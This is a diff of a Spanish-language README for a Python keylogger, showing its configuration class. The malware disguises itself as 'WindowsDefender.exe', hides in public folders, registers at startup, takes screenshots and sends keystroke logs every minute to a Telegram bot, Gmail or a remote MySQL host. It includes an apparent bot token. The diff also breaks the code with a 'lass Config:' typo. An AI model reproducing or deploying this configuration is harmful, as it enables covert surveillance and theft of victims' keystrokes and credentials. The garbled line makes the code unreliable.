@@ -6,21 +6,22 @@ Proceso de Opciones avanzada del keylogger.
 
 __NOTA:__ Si no sabe no toque.
 ````py
-class Config:
+lass Config:
     def __init__(self):
         self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
-        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
-        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
-        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
+        self.NAME_REG = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"           # Ruta del Registro de teclas
         self.LOG_NAME = "reg" + "." + "k"
-        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY  # <No cambiar>
-        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME
-                                                # Nombre y extensión del registro
-        # Importante
-        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
-        self.MODE = 2     # 0 = Gmail
-                          # 1 = DataBase                                            # Solo se puede usar una opción
-                          # 2 = TelegramBot
+        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
+        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY         # <No cambiar>
+        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
+        self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
+        self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
+        self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
+        self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
+        self.MODE_SEND = 2      # 0 = Gmail
+                           # 1 = DataBase                                           # Solo se puede usar una opción
+                           # 2 = TelegramBot
     class DataBase:  # Clase de Base de datos
         def __init__(self):
             self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
@@ -42,10 +43,12 @@ class Config:
           # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
     class TelegramBot:
         def __init__(self):
-            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID   = 831233303                                                     # ID Principal [Obligatorio]
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
+            # Personalize
+            self.LEN_TEXT = 2#3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 ````
 
 # Proceso de conversión: `*.py a *.exe`
